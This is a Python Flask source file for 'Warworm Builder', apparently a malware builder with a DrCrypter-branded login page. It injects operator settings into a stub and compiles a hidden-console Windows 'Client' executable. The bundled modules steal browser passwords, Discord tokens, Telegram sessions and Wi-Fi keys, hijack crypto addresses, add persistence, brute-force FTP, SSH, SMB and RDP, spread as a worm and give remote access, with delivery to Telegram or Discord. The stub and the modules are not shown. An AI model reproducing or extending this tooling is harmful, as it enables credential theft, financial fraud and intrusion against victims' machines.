#!/usr/bin/env python3
"""
Builder v1.3.0 - Token-Protected Web Dashboard
Runs build server, serves dashboard, generates file client.exe
"""

import os
import sys
import json
import shutil
import subprocess
import re
import secrets  
import hmac
from datetime import datetime
from functools import wraps
from flask import Flask, request, jsonify, send_file, render_template_string, session, redirect, url_for

# ==================== Configuration ====================
DEFAULT_CONFIG = {
    "version": "1.3.0",
    "last_updated": datetime.now().isoformat(),
    "webui_token": "",  # Generated on first run
    "pyinstaller_settings": {
        "onefile": True,
        "noconsole": True,
        "clean": True,
        "upx": False,
        "debug": False
    },
    "delivery": {
        "telegram_token": "",
        "telegram_chat_id": "",
        "discord_webhook": ""
    },
    "features": {
        "system_info": True,
        "screenshot": True,
        "browser_passwords": True,
        "process_manager": False,
        "discord_token": False,
        "telegram_session": False,
        "network_scan": False,
        "wifi_passwords": False,
        "crypto_clipper": False,
        "persistence": False,
        "auto_brute": False,
        "remote_desktop": False,
        "file_manager": False
    },
    "network_settings": {
        "threads": 50,
        "timeout": 1.0,
        "ports": [21, 22, 23, 445, 3389]
    },
    "crypto_addresses": {
        "Bitcoin": "",
        "Ethereum": "",
        "Litecoin": "",
        "Monero": "",
        "Dogecoin": ""
    },
    "browsers": ["Chrome", "Edge", "Firefox", "Brave", "Opera", "Opera GX", "Vivaldi", "Yandex"],
    "brute_services": {
        "ftp": False,
        "ssh": False,
        "telnet": False,
        "smb": False,
        "rdp": False
    },
    "ngrok_token": "",
    "rmm_port": 5001,
    "remote_access_password": "",
}   


import threading
from concurrent.futures import ThreadPoolExecutor
import uuid
import time
build_tasks = {}
executor = ThreadPoolExecutor(max_workers=2)  # Max 2 concurrent builds

# ==================== Flask App ====================
app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_hex(32)
app.config['SESSION_TYPE'] = 'filesystem'

# Token storage
DASHBOARD_TOKEN = None

def generate_token():
    """Generate secure dashboard token"""
    return secrets.token_urlsafe(32)

def token_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('builder_authenticated'):
            if request.is_json:
                return jsonify({'error': 'Authentication required', 'login_required': True}), 401
            return redirect(url_for('login_page'))
        return f(*args, **kwargs)
    return decorated_function

# Current configuration (in memory)
current_config = DEFAULT_CONFIG.copy()

# Paths
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DASHBOARD_HTML = os.path.join(BASE_DIR, 'templates', 'dashboard.html')
STUB_PY = os.path.join(BASE_DIR, 'stub.txt')
MODULES_DIR = os.path.join(BASE_DIR, 'modules')
UPX_DIR = os.path.join(BASE_DIR, 'upx')
BUILDS_DIR = os.path.join(BASE_DIR, 'builds')
STATIC_DIR = os.path.join(BASE_DIR, 'File_Generated')
TOKENS_FILE = os.path.join(BASE_DIR, '.builder_tokens')

# Ensure directories exist
os.makedirs(os.path.join(BASE_DIR, 'templates'), exist_ok=True)
os.makedirs(BUILDS_DIR, exist_ok=True)
os.makedirs(STATIC_DIR, exist_ok=True)
os.makedirs(MODULES_DIR, exist_ok=True)

# ==================== Login Page ====================
LOGIN_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Warworm Builder | Authentication Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: radial-gradient(ellipse at top, #1a1a2e 0%, transparent 50%),
                        radial-gradient(ellipse at bottom, #16213e 0%, transparent 50%),
                        #0a0a0f;
            color: #fff;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .login-box {
            background: rgba(20, 20, 30, 0.9);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            padding: 3rem;
            width: 90%;
            max-width: 420px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
            text-align: center;
        }
        .logo {
            width: 160px;  /* was 80px */
            height: 160px; /* was 80px */
            background: transparent; /* remove gradient */
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 2rem auto;
            /* remove box-shadow line */
        }
        h1 {
            font-size: 1.75rem;
            margin-bottom: 0.5rem;
            background: linear-gradient(135deg, #00f0ff, #0066ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .subtitle { color: #888; margin-bottom: 2rem; font-size: 0.95rem; }
        .input-group { position: relative; margin-bottom: 1.5rem; }
        input[type="password"] {
            width: 100%;
            padding: 1rem 1.25rem;
            background: rgba(0,0,0,0.3);
            border: 2px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            color: #fff;
            font-size: 1rem;
            text-align: center;
            letter-spacing: 3px;
            transition: all 0.3s;
        }
        input[type="password"]:focus {
            outline: none;
            border-color: #00f0ff;
            box-shadow: 0 0 0 4px rgba(0, 240, 255, 0.1);
        }
        button {
            width: 100%;
            padding: 1rem;
            background: linear-gradient(135deg, #00f0ff, #0066ff);
            border: none;
            border-radius: 12px;
            color: #000;
            font-weight: 700;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.3s;
        }
        button:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0, 240, 255, 0.4);
        }
        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .error {
            color: #ff4757;
            margin-top: 1rem;
            padding: 0.75rem;
            background: rgba(255, 71, 87, 0.1);
            border-radius: 8px;
            display: none;
            font-size: 0.9rem;
        }
        .token-hint {
            margin-top: 1.5rem;
            padding: 1rem;
            background: rgba(0, 255, 136, 0.05);
            border: 1px solid rgba(0, 255, 136, 0.2);
            border-radius: 8px;
            font-size: 0.8rem;
            color: #00ff88;
        }
        .token-hint code {
            font-family: 'Courier New', monospace;
            background: rgba(0,0,0,0.3);
            padding: 0.2rem 0.5rem;
            border-radius: 4px;
        }

        .brand-icon {
            width: 48px;
            height: 48px;
            /* background: linear-gradient(...) */  /* Also remove gradient since you're using image */
            border-radius: var(--radius);
            display: flex;
            align-items: center;
            justify-content: center;
            /* box-shadow: 0 4px 20px rgba(0, 212, 255, 0.3); */  /* REMOVE THIS LINE */
        }
    </style>
</head>
<body>
    <div class="login-box">
        <a href="https://drcrypter.net" target="_blank" class="logo" style="display: flex; margin: 0 auto 2rem auto; width: 160px; height: 160px; align-items: center; justify-content: center; overflow: hidden; text-decoration: none; background: transparent; box-shadow: none;">
            <img src="https://drcrypter.net/data/assets/logo/logo1.png" alt="DrCrypter" style="width: 100%; height: 100%; object-fit: contain; border-radius: 20px;">
        </a>
        <h1>Warworm Builder</h1>
        <div class="subtitle">Secure Build Dashboard</div>
        
        <div class="input-group">
            <input type="password" id="tokenInput" placeholder="••••••••••••••••" autocomplete="off">
        </div>
        
        <button onclick="authenticate()" id="loginBtn">Access Dashboard</button>
        <div class="error" id="error">Invalid access token</div>
        
        <div class="token-hint">
            Token is displayed in console on startup<br>
            File: <code>.builder_tokens</code>
        </div>
    </div>
    
    <script>
        async function authenticate() {
            const btn = document.getElementById('loginBtn');
            const token = document.getElementById('tokenInput').value.trim();
            const error = document.getElementById('error');
            
            if (!token) return;
            
            btn.disabled = true;
            btn.textContent = 'Verifying...';
            error.style.display = 'none';
            
            try {
                const res = await fetch('/api/auth', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({token: token})
                });
                
                const data = await res.json();
                
                if (data.success) {
                    btn.textContent = 'Success!';
                    btn.style.background = 'linear-gradient(135deg, #00ff88, #00cc6a)';
                    setTimeout(() => window.location.href = '/', 500);
                } else {
                    error.textContent = data.message || 'Invalid token';
                    error.style.display = 'block';
                    btn.disabled = false;
                    btn.textContent = 'Access Dashboard';
                }
            } catch(e) {
                error.textContent = 'Connection failed';
                error.style.display = 'block';
                btn.disabled = false;
                btn.textContent = 'Access Dashboard';
            }
        }
        
        document.getElementById('tokenInput').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') authenticate();
        });
        
        document.getElementById('tokenInput').focus();
    </script>
</body>
</html>'''

# Helper Functions 
def load_dashboard_html():
    # Read dashboard.html and return as string. 
    try:
        with open(DASHBOARD_HTML, 'r', encoding='utf-8') as f:
            return f.read()
    except Exception as e:
 
        return generate_default_dashboard()

def generate_default_dashboard():
    # Generate default dashboard HTML  
    return """<!DOCTYPE html>
<html>
<head>
    <title>Warworm Builder</title>
    <meta charset="utf-8">
    <style>
        body { font-family: sans-serif; background: #0a0a0f; color: #fff; padding: 2rem; }
        .error { color: #ff4757; }
    </style>
</head>
<body>
    <h1>⚠️ Dashboard Template Missing</h1>
    <p class="error">Please ensure templates/dashboard.html exists</p>
    <p>The builder is running but cannot load the UI template.</p>
</body>
</html>"""

def config_to_python(config):
    """Convert config dict to Python code string."""
    json_str = json.dumps(config, indent=4)
    json_str = re.sub(r': true\b', ': True', json_str)
    json_str = re.sub(r': false\b', ': False', json_str)
    json_str = re.sub(r': null\b', ': None', json_str)
    return json_str

def replace_config_in_stub(stub_content, new_config):
    """Replace the CONFIG dictionary in stub.py with new_config."""
    # Pattern to find CONFIG = { ... } (multiline)
    pattern = r'(CONFIG\s*=\s*\{)([^{}]*\{[^{}]*\}[^{}]*|\s*.*?)(\n\})'
    
    config_str = config_to_python(new_config)
    # Indent properly
    lines = config_str.split('\n')
    indented = '\n'.join(['    ' + line if i > 0 else line for i, line in enumerate(lines)])
    
    replacement = f'CONFIG = {indented}'
    
    # Try to replace using regex
    new_content = re.sub(r'CONFIG\s*=\s*\{[\s\S]*?\n\}', replacement, stub_content)
    
    # If regex failed, try line-by-line
    if new_content == stub_content:
        lines = stub_content.splitlines()
        start_idx = None
        for i, line in enumerate(lines):
            if line.strip().startswith('CONFIG ='):
                start_idx = i
                break
        
        if start_idx is not None:
            brace_count = 0
            end_idx = start_idx
            in_dict = False
            for i in range(start_idx, len(lines)):
                for char in lines[i]:
                    if char == '{':
                        brace_count += 1
                        in_dict = True
                    elif char == '}':
                        brace_count -= 1
                        if brace_count == 0 and in_dict:
                            end_idx = i
                            break
                if brace_count == 0 and in_dict:
                    break
            
            indent = '    '
            config_lines = config_str.splitlines()
            new_block = [f'{indent}CONFIG = {{'] + [f'{indent}{line}' for line in config_lines[1:-1]] + [f'{indent}}}']
            lines = lines[:start_idx] + new_block + lines[end_idx+1:]
            new_content = '\n'.join(lines)
    
    return new_content

def save_token(token):
    """Save token to file for persistence"""
    try:
        with open(TOKENS_FILE, 'w') as f:
            f.write(f"BUILDER_TOKEN={token}\n")
            f.write(f"GENERATED={datetime.now().isoformat()}\n")
            f.write("WARNING: Do not share this token!\n")
    except Exception as e:
        print(f"[!] Could not save token file: {e}")

def load_token():
    """Load existing token or return None"""
    if os.path.exists(TOKENS_FILE):
        try:
            with open(TOKENS_FILE, 'r') as f:
                for line in f:
                    if line.startswith('BUILDER_TOKEN='):
                        return line.split('=', 1)[1].strip()
        except:
            pass
    return None



def run_pyinstaller(build_dir, loader_path, settings, config=None):
    # Run PyInstaller with the given settings 
    cmd = ['pyinstaller', '--distpath', 'dist', '--workpath', 'build', '--specpath', '.']

    if settings.get('onefile'):
        cmd.append('--onefile')
    if settings.get('noconsole'):
        cmd.append('--noconsole')
    if settings.get('clean'):
        cmd.append('--clean')

    sep = ';' if sys.platform == 'win32' else ':'
    modules_src = os.path.join(build_dir, 'modules')

    if os.path.exists(modules_src):
        cmd.extend(['--add-data', f'{modules_src}{sep}modules'])
        print(f"[BUILDER] Adding modules: {modules_src}")

    hidden_imports = [
        'requests', 'requests.packages.urllib3', 'paramiko', 'paramiko.transport',
        'paramiko.client', 'cryptography', 'cryptography.hazmat', 
        'cryptography.hazmat.backends', 'cryptography.hazmat.primitives',
        '_cffi_backend', 'bcrypt', 'nacl', 'smbprotocol', 'wmi', 'win32com',
        'win32com.client', 'ftplib', 'socket', 'threading', 'json', 'subprocess',
        'uuid', 'struct', 'hashlib', 'time', 'os', 'datetime', 'base64',
        'tempfile', 'shutil', 'zipfile', 'psutil', 'ctypes', 'ctypes.wintypes',
        'PIL', 'PIL.Image', 'PIL.ImageGrab', 'flask', 'flask.helpers',
        'werkzeug', 'pyautogui', 'pyautogui._pyautogui_win',
        'mouseinfo', 'pyperclip', 'pyrect', 'pyscreeze', 'pymsgbox', 'pytweening',
        'modules.remote_access', 'modules.collected_info', 'modules.telegram_steal',
        'modules.discord_token', 'modules.browser_stealer', 'modules.persistence',
        'modules.wifi_stealer', 'modules.bot', 'modules.crypto_clipper',
        'modules.worm_network', 'modules.process_manager'
    ]

    for imp in hidden_imports:
        cmd.extend(['--hidden-import', imp])

    if settings.get('upx'):
        upx_exe = os.path.join(UPX_DIR, 'upx.exe') if sys.platform == 'win32' else os.path.join(UPX_DIR, 'upx')
        if os.path.exists(upx_exe):
            abs_upx_dir = os.path.abspath(UPX_DIR)
            print(f"[BUILDER] UPX enabled: {upx_exe}")
            cmd.extend(['--upx-dir', abs_upx_dir])

    cmd.append(loader_path)

    print(f"[BUILDER] Running PyInstaller...")
    result = subprocess.run(cmd, cwd=build_dir, capture_output=True, text=True)

    if result.returncode != 0:
        print(f"[BUILDER] PyInstaller error:\n{result.stderr}")
        return None

    exe_name = os.path.splitext(os.path.basename(loader_path))[0]
    if sys.platform == 'win32':
        exe_name += '.exe'

    dist_exe = os.path.join(build_dir, 'dist', exe_name)
    if os.path.exists(dist_exe):
        final_exe = os.path.join(build_dir, exe_name)
        if dist_exe != final_exe:
            shutil.move(dist_exe, final_exe)
        return final_exe

    for f in os.listdir(build_dir):
        if f == exe_name:
            return os.path.join(build_dir, f)

    return None


def run_build_async(build_id, build_dir, loader_path, settings, config):
    # Run PyInstaller in background thread 
    try:
        build_tasks[build_id]['status'] = 'building'
        build_tasks[build_id]['progress'] = 'Running PyInstaller...'
        
        exe_path = run_pyinstaller(build_dir, loader_path, settings, config)
        
        if exe_path and os.path.exists(exe_path):
            # Move to output directory
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            exe_name = f"Client_{timestamp}.exe" if sys.platform == 'win32' else f"Client_{timestamp}"
            final_exe = os.path.join(STATIC_DIR, exe_name)
            shutil.move(exe_path, final_exe)
            
            build_tasks[build_id].update({
                'status': 'completed',
                'progress': 'Build successful',
                'filename': exe_name,
                'download_url': f'/download/{exe_name}',
                'completed_at': datetime.now().isoformat()
            })
        else:
            build_tasks[build_id].update({
                'status': 'failed',
                'progress': 'Build failed - check logs',
                'error': 'PyInstaller did not produce output file'
            })
            
    except Exception as e:
        build_tasks[build_id].update({
            'status': 'failed',
            'progress': f'Error: {str(e)}',
            'error': str(e)
        })


@app.route('/api/build/status/<build_id>')
@token_required
def build_status(build_id):
    """Check build status"""
    if build_id not in build_tasks:
        return jsonify({'error': 'Build not found'}), 404
    
    task = build_tasks[build_id]
    response = {
        'build_id': build_id,
        'status': task['status'],
        'progress': task.get('progress', ''),
    }
    
    if task['status'] == 'completed':
        response['download_url'] = task['download_url']
        response['filename'] = task['filename']
    elif task['status'] == 'failed':
        response['error'] = task.get('error', 'Unknown error')
    
    return jsonify(response)

@app.route('/api/build/cleanup', methods=['POST'])
@token_required
def cleanup_builds():
    """Clean up old build records"""
    cutoff = time.time() - 3600  # 1 hour old
    to_remove = []
    
    for build_id, task in build_tasks.items():
        created = datetime.fromisoformat(task['created_at']).timestamp()
        if created < cutoff and task['status'] in ['completed', 'failed']:
            to_remove.append(build_id)
    
    for bid in to_remove:
        del build_tasks[bid]
    
    return jsonify({'cleaned': len(to_remove)})

@app.route('/api/build', methods=['POST'])
@token_required
def build():
    global current_config
    data = request.get_json()
    
    if data:
        def deep_merge(a, b):
            for key in b:
                if key in a and isinstance(a[key], dict) and isinstance(b[key], dict):
                    deep_merge(a[key], b[key])
                else:
                    a[key] = b[key]
            return a
        current_config = deep_merge(current_config, data)

    # Generate unique build ID
    build_id = str(uuid.uuid4())[:8]
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    build_dir = os.path.join(BUILDS_DIR, f'build_{timestamp}_{build_id}')
    os.makedirs(build_dir, exist_ok=True)

    try:
        # Copy modules and prepare files (quick setup)
        dest_modules = os.path.join(build_dir, 'modules')
        if os.path.exists(MODULES_DIR):
            shutil.copytree(MODULES_DIR, dest_modules)

        essential_files = ['remote_access.py', 'collected_info.py', 'telegram_steal.py', 
                          'discord_token.py', 'browser_stealer.py', 'persistence.py',
                          'wifi_stealer.py', 'bot.py', 'crypto_clipper.py', 
                          'worm_network.py', 'process_manager.py']
        
        for fname in essential_files:
            src = os.path.join(MODULES_DIR, fname)
            if os.path.exists(src):
                shutil.copy2(src, build_dir)

        # Read stub and inject config
        with open(STUB_PY, 'r', encoding='utf-8') as f:
            stub_content = f.read()

        loader_content = replace_config_in_stub(stub_content, current_config)
        loader_path = os.path.join(build_dir, 'loader.py')
        with open(loader_path, 'w', encoding='utf-8') as f:
            f.write(loader_content)

        # Initialize build task
        build_tasks[build_id] = {
            'id': build_id,
            'status': 'starting',
            'progress': 'Initializing build...',
            'created_at': datetime.now().isoformat(),
            'build_dir': build_dir
        }

        # Start build in background thread
        future = executor.submit(
            run_build_async,
            build_id,
            build_dir,
            loader_path,
            current_config['pyinstaller_settings'],
            current_config
        )

        # Return immediately with build ID
        return jsonify({
            'success': True,
            'build_id': build_id,
            'message': 'Build started',
            'status': 'building',
            'check_url': f'/api/build/status/{build_id}'
        })

    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500



# ==================== Routes ====================
@app.route('/login')
def login_page():
    if session.get('builder_authenticated'):
        return redirect(url_for('index'))
    return LOGIN_HTML

@app.route('/api/auth', methods=['POST'])
def api_auth():
    global DASHBOARD_TOKEN
    data = request.get_json()
    if not data:
        return jsonify({'success': False, 'message': 'No data provided'}), 400
    
    token = data.get('token', '').strip()
    
    if not token:
        return jsonify({'success': False, 'message': 'Token required'}), 400
    
    if not DASHBOARD_TOKEN:
        return jsonify({'success': False, 'message': 'Server not initialized'}), 500
    
    if hmac.compare_digest(token.encode(), DASHBOARD_TOKEN.encode()):
        session['builder_authenticated'] = True
        session['login_time'] = datetime.now().isoformat()
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'message': 'Invalid token'}), 403

@app.route('/api/logout', methods=['POST'])
@token_required
def api_logout():
    session.clear()
    return jsonify({'success': True})

@app.route('/')
@token_required
def index():
    return render_template_string(load_dashboard_html(), token=DASHBOARD_TOKEN[:16] + "...")

@app.route('/api/config', methods=['GET'])
@token_required
def get_config():
    global current_config
    try:
        if os.path.exists('config_db.json'):
            with open('config_db.json', 'r', encoding='utf-8') as f:
                disk_config = json.load(f)
                if disk_config:
                    # Merge carefully to preserve structure
                    for key in disk_config:
                        if key in current_config:
                            if isinstance(current_config[key], dict) and isinstance(disk_config[key], dict):
                                current_config[key].update(disk_config[key])
                            else:
                                current_config[key] = disk_config[key]
                        else:
                            current_config[key] = disk_config[key]
    except Exception as e:
        print(f"[BUILDER] Failed to load config_db.json: {e}")
    
    # Don't expose the full token in API
    safe_config = current_config.copy()
    if 'webui_token' in safe_config:
        safe_config['webui_token'] = safe_config['webui_token'][:8] + '...' if safe_config['webui_token'] else ''
    
    return jsonify(safe_config)

@app.route('/api/save', methods=['POST'])
@token_required
def save_config():
    global current_config
    try:
        data = request.get_json()
        if data:
            def deep_merge(a, b):
                for key in b:
                    if key in a and isinstance(a[key], dict) and isinstance(b[key], dict):
                        deep_merge(a[key], b[key])
                    else:
                        a[key] = b[key]
                return a

            current_config = deep_merge(current_config, data)
            current_config['last_updated'] = datetime.now().isoformat()

            try:
                with open('config_db.json', 'w', encoding='utf-8') as f:
                    json.dump(current_config, f, indent=2)
                print(f"[BUILDER] Config saved to disk")
            except Exception as e:
                print(f"[BUILDER] Failed to save: {e}")
                return jsonify({'success': False, 'message': str(e)}), 500

            return jsonify({'success': True, 'message': 'Configuration saved'})
    except Exception as e:
        print(f"[BUILDER] Error in save: {e}")
        return jsonify({'success': False, 'message': str(e)}), 400

    return jsonify({'success': False, 'message': 'No data provided'}), 400

# @app.route('/api/build', methods=['POST'])
# @token_required
# def build():
#     global current_config
#     data = request.get_json()
    
#     if data:
#         def deep_merge(a, b):
#             for key in b:
#                 if key in a and isinstance(a[key], dict) and isinstance(b[key], dict):
#                     deep_merge(a[key], b[key])
#                 else:
#                     a[key] = b[key]
#             return a

#         current_config = deep_merge(current_config, data)

#     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
#     build_dir = os.path.join(BUILDS_DIR, f'build_{timestamp}')
#     os.makedirs(build_dir, exist_ok=True)

#     try:
#         # Copy modules
#         dest_modules = os.path.join(build_dir, 'modules')
#         if os.path.exists(MODULES_DIR):
#             shutil.copytree(MODULES_DIR, dest_modules)
#             print(f"[BUILDER] Copied modules")

#         # Copy essential files
#         essential_files = ['remote_access.py', 'collected_info.py', 'telegram_steal.py', 
#                           'discord_token.py', 'browser_stealer.py', 'persistence.py',
#                           'wifi_stealer.py', 'bot.py', 'crypto_clipper.py', 
#                           'worm_network.py', 'process_manager.py']
        
#         for fname in essential_files:
#             src = os.path.join(MODULES_DIR, fname)
#             if os.path.exists(src):
#                 shutil.copy2(src, build_dir)

#         # Read stub and inject config
#         if not os.path.exists(STUB_PY):
#             return jsonify({
#                 'success': False,
#                 'message': f'stub.py not found at: {STUB_PY}'
#             }), 400

#         with open(STUB_PY, 'r', encoding='utf-8') as f:
#             stub_content = f.read()

#         loader_content = replace_config_in_stub(stub_content, current_config)

#         loader_path = os.path.join(build_dir, 'loader.py')
#         with open(loader_path, 'w', encoding='utf-8') as f:
#             f.write(loader_content)
#             print(f"[BUILDER] Created loader.py with injected config")

#         # Run PyInstaller
#         exe_path = run_pyinstaller(
#             build_dir, 
#             loader_path, 
#             current_config['pyinstaller_settings'], 
#             current_config
#         )

#         if not exe_path:
#             return jsonify({
#                 'success': False, 
#                 'message': 'Build failed - check console for errors'
#             }), 500

#         # Move to output
#         exe_name = f"Client_{timestamp}.exe" if sys.platform == 'win32' else f"Client_{timestamp}"
#         final_exe = os.path.join(STATIC_DIR, exe_name)

#         if os.path.exists(final_exe):
#             os.remove(final_exe)

#         shutil.move(exe_path, final_exe)
#         print(f"[BUILDER] Build successful: {final_exe}")

#         return jsonify({
#             'success': True, 
#             'download_url': f'/download/{exe_name}',
#             'filename': exe_name
#         })

#     except Exception as e:
#         print(f"[BUILDER] Build error: {e}")
#         import traceback
#         traceback.print_exc()
#         return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/download/<path:filename>')
@token_required
def serve_file(filename):
    return send_file(os.path.join(STATIC_DIR, filename), as_attachment=True)

if __name__ == '__main__':
    print("=" * 70)
    print(" Warworm Builder v1.3.0 - Protected Build Server")
    print("=" * 70)
    
    # init token
    existing_token = load_token()
    if existing_token:
        DASHBOARD_TOKEN = existing_token
        print(f"[+] Loaded existing token from {TOKENS_FILE}")
    else:
        DASHBOARD_TOKEN = generate_token()
        save_token(DASHBOARD_TOKEN)
        print(f"[+] Generated new access token")
    
    print(f"\n{'='*70}")
    print(f" ACCESS TOKEN: {DASHBOARD_TOKEN}")
    print(f"{'='*70}")
    print(f"\n[+] Save this token! It will not be shown again.")
    print(f"[+] Also saved to: {TOKENS_FILE}")
    print(f"[+] Dashboard URL: http://127.0.0.1:5000")
    print(f"[+] Press Ctrl+C to stop")
    print("=" * 70)
    
    # Save token to config if not exists
    if os.path.exists('config_db.json'):
        try:
            with open('config_db.json', 'r+') as f:
                cfg = json.load(f)
                cfg['webui_token'] = DASHBOARD_TOKEN
                f.seek(0)
                json.dump(cfg, f, indent=2)
                f.truncate()
        except:
            pass
    else:
        DEFAULT_CONFIG['webui_token'] = DASHBOARD_TOKEN
        with open('config_db.json', 'w') as f:
            json.dump(DEFAULT_CONFIG, f, indent=2)
    
    try:
        app.run(debug=False, host='0.0.0.0', port=5000, threaded=True)
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
        sys.exit(0)